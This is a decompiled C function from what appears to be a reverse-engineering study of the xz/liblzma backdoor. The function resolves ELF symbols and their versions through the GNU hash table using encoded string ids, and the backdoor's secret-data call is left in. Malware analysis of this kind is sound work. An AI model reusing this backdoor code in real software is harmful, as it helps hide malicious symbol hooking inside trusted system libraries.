// /home/kali/xzre-ghidra/xzregh/101880_elf_symbol_get.c
// Function: elf_symbol_get @ 0x101880
// Calling convention: __stdcall
// Prototype: Elf64_Sym * __stdcall elf_symbol_get(elf_info_t * elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version)


/*
 * AutoDoc: Symbol resolver that trusts the GNU hash table the loader extracted earlier. After emitting secret-data telemetry it iterates every
 * bucket, validates the bucket and chain addresses, and replays the GNU hash walk to pull `Elf64_Sym` entries out of `.dynsym`.
 * Candidates must have both `st_value` and `st_shndx` populated and their names get hashed (via `get_string_id`) so the caller’s
 * encoded id can be matched without copying strings around.
 *
 * When a version id is supplied the helper also consults `.gnu.version`/`.gnu.version_d`: it reads the `versym` slot, walks the
 * linked `Elf64_Verdef` list, and compares the version string id. Returning NULL means the symbol/version was missing, the module
 * never exposed the GNU hash + version tables, or one of the string/relocation pointers failed validation mid-walk.
 */
#include "xzre_types.h"

Elf64_Sym *
elf_symbol_get(elf_info_t *elf_info,EncodedStringId encoded_string_id,EncodedStringId sym_version)

{
  ushort versym_index;
  uint dynstr_offset;
  u32 *gnu_hash_table;
  char *dynstr_base;
  u32 chain_hash_word;
  BOOL range_ok;
  EncodedStringId candidate_string_id;
  Elf64_Sym *sym_entry;
  ulong chain_index;
  ushort *versym_entry;
  Elf64_Verdef *verdef_entry;
  uint bucket_idx;
  uint *verdef_aux_ptr;
  u32 *chain_cursor;
  uint verdef_iter;
  
  // AutoDoc: Emit a secret-data breadcrumb before touching the GNU hash tables so symbol hunts show up in the telemetry log.
  range_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x58,0xf,3,FALSE);
  if ((range_ok != FALSE) && ((sym_version == 0 || ((elf_info->feature_flags & 0x18) == 0x18)))) {
    for (bucket_idx = 0; bucket_idx < elf_info->gnu_hash_nbuckets; bucket_idx = bucket_idx + 1) {
      gnu_hash_table = elf_info->gnu_hash_buckets;
      range_ok = elf_contains_vaddr(elf_info,gnu_hash_table + bucket_idx,4,4);
      if (range_ok == FALSE) {
        return (Elf64_Sym *)0x0;
      }
      dynstr_offset = gnu_hash_table[bucket_idx];
      gnu_hash_table = elf_info->gnu_hash_chain;
      range_ok = elf_contains_vaddr(elf_info,gnu_hash_table + dynstr_offset,8,4);
      chain_cursor = gnu_hash_table + dynstr_offset;
      if (range_ok == FALSE) {
        return (Elf64_Sym *)0x0;
      }
      do {
        chain_index = (long)chain_cursor - (long)elf_info->gnu_hash_chain >> 2 & 0xffffffff;
        sym_entry = elf_info->dynsym + chain_index;
        range_ok = elf_contains_vaddr(elf_info,sym_entry,0x18,4);
        if (range_ok == FALSE) {
          return (Elf64_Sym *)0x0;
        }
        // AutoDoc: Skip undefined/imported symbols—the resolver only accepts entries that already have a concrete value and section.
        if ((sym_entry->st_value != 0) && (sym_entry->st_shndx != 0)) {
          dynstr_offset = sym_entry->st_name;
          dynstr_base = elf_info->dynstr;
          range_ok = elf_contains_vaddr(elf_info,dynstr_base + dynstr_offset,1,4);
          if (range_ok == FALSE) {
            return (Elf64_Sym *)0x0;
          }
          candidate_string_id = get_string_id(dynstr_base + dynstr_offset,(char *)0x0);
          if (candidate_string_id == encoded_string_id) {
            if (sym_version == 0) {
              return sym_entry;
            }
            versym_entry = (ushort *)(chain_index * 2 + (long)elf_info->versym);
            range_ok = elf_contains_vaddr(elf_info,versym_entry,2,4);
            if (range_ok == FALSE) {
              return (Elf64_Sym *)0x0;
            }
            versym_index = *versym_entry;
            // AutoDoc: When versioning metadata exists, walk `.gnu.version_d` to make sure the caller’s requested version string also matches.
            if (((elf_info->feature_flags & 0x18) == 0x18) && ((versym_index & 0x7ffe) != 0)) {
              verdef_entry = elf_info->verdef;
              verdef_iter = 0;
              do {
                if (((elf_info->verdef_count <= (ulong)verdef_iter) ||
                    (range_ok = elf_contains_vaddr(elf_info,verdef_entry,0x14,4), range_ok == FALSE)) ||
                   ((short)*verdef_entry != 1)) break;
                if ((versym_index & 0x7fff) == *(ushort *)((long)verdef_entry + 4)) {
                  verdef_aux_ptr = (uint *)((ulong)*(uint *)((long)verdef_entry + 0xc) + (long)verdef_entry);
                  range_ok = elf_contains_vaddr(elf_info,verdef_aux_ptr,8,4);
                  if (range_ok == FALSE) break;
                  dynstr_offset = *verdef_aux_ptr;
                  dynstr_base = elf_info->dynstr;
                  range_ok = elf_contains_vaddr(elf_info,dynstr_base + dynstr_offset,1,4);
                  if (range_ok == FALSE) break;
                  candidate_string_id = get_string_id(dynstr_base + dynstr_offset,(char *)0x0);
                  if (sym_version == candidate_string_id) {
                    return sym_entry;
                  }
                }
                if ((uint)verdef_entry[2] == 0) break;
                verdef_iter = verdef_iter + 1;
                verdef_entry = (Elf64_Verdef *)((long)verdef_entry + (ulong)(uint)verdef_entry[2]);
              } while( TRUE );
            }
          }
        }
        chain_hash_word = *chain_cursor;
        chain_cursor = chain_cursor + 1;
      } while ((chain_hash_word & 1) == 0);
    }
  }
  return (Elf64_Sym *)0x0;
}

